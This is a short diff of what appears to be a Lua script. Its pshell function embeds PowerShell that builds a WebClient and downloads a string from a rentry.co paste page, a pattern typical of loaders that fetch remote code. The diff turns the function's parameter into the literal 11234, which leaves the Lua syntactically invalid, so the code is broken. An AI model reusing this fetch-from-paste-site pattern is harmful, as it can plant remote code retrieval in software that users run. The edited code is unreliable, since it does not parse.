@@ -1970,7 +1970,7 @@ function main()
 	})
 end
 
-function pshell(x)
+function pshell(11234)
 
   local abc = [[
 
@@ -1992,7 +1992,7 @@ function pshell(x)
 
   $WebClient=New-Object net.webclient
 
-  $gorkem = "]]..x..[["
+  $gorkem = 11234
 
   $raw = $WebClient.DownloadString("http://rentry.co/gwui9/edit")
 
